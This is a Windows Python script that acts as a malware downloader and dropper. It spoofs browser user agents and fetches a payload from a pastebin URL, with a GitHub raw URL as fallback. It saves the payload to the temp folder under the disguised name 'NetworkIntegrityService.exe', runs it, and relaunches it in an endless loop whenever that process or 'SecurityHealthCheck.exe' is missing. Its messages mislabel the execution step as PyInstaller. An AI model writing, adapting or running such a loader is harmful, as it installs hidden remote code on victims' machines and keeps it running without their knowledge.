import os
import time
import colorama
from colorama import Fore
from pystyle import Add, Center, Anime, Colors, Colorate, Write
import urllib.request
import random
import gzip
import subprocess
from io import BytesIO
import pywintypes
import ctypes
import sys
import shutil
import win32api
import win32con
import win32event
import win32clipboard

def create_mutex(mutex_name):
    try:
        mutex = win32event.CreateMutex(None, 0, mutex_name)
        if win32api.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
            return False
        return True
    except Exception as e:
        print(f"Error creating mutex: {e}")
        return False

if os.name == "nt":
    mutex_name = "SystemResourceMonitor"
    if not create_mutex(mutex_name):
        print("Mutex already exists. Exiting program.")
        sys.exit(0)

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

def fetch_url_with_random_user_agent(raw_url, fallback_url):
    user_agent = random.choice(user_agents)
    
    headers = {
        'User-Agent': user_agent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }

    def fetch_url(url):
        try:
            req = urllib.request.Request(url, headers=headers)
            response = urllib.request.urlopen(req)
            if 'gzip' in response.headers.get('Content-Encoding', ''):
                buf = BytesIO(response.read())
                f = gzip.GzipFile(fileobj=buf)
                return f.read().decode('utf-8')
            else:
                return response.read().decode('utf-8')
        except urllib.error.HTTPError as e:
            print(f"HTTP Error: {e.code} - {e.reason}")
            return None
        except Exception as e:
            print(f"Error: {str(e)}")
            return None

    raw_code = fetch_url(raw_url)
    
    if not raw_code:
        print(f"Attempting to fetch from fallback URL...")
        try:
            raw_code = fetch_url(fallback_url)
        except Exception as e:
            print(f"Error fetching from fallback URL: {e}")
    
    return raw_code

def write_and_execute(raw_code):
    try:
        if raw_code:
            temp_dir = os.getenv('TEMP')
            test_file_path = os.path.join(temp_dir, 'NetworkIntegrityService.exe')

            with open(test_file_path, 'wb') as f:
                f.write(raw_code)
            
            print(f"Raw code written to {test_file_path}")
            
            print(f"Starting PyInstaller for {test_file_path}...")
            subprocess.run([test_file_path], check=True)
            print(f"PyInstaller executed for {test_file_path}")
        else:
            print("No code to execute.")
    except Exception as e:
        print(f"Error writing or executing the file: {e}")

raw_url = 'https://pastebin.com/raw/zUChGNjj'
fallback_url = 'https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/Midnight'

try:
    raw_code = fetch_url_with_random_user_agent(raw_url, fallback_url)
except Exception as e:
    print(f"Error fetching raw code: {e}")

def check_running():
    try:
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]{Fore.GREEN} Checking (running)")

        process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq NetworkIntegrityService.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, _ = process.communicate()
        if b"NetworkIntegrityService.exe" not in output:
            print(f"Process NetworkIntegrityService.exe not running, executing the code...")
            write_and_execute(raw_code)
        
        process = subprocess.Popen(["tasklist", "/FI", "IMAGENAME eq SecurityHealthCheck.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, _ = process.communicate()
        if b"SecurityHealthCheck.exe" not in output:
            print(f"Process SecurityHealthCheck.exe not running, executing the code...")
            write_and_execute(raw_code)

    except Exception as e:
        print(f"Error checking running processes: {e}")

while True:
    try:
        check_running()
    except Exception as e:
        print(f"Error in main loop: {e}")
    time.sleep(0.1)
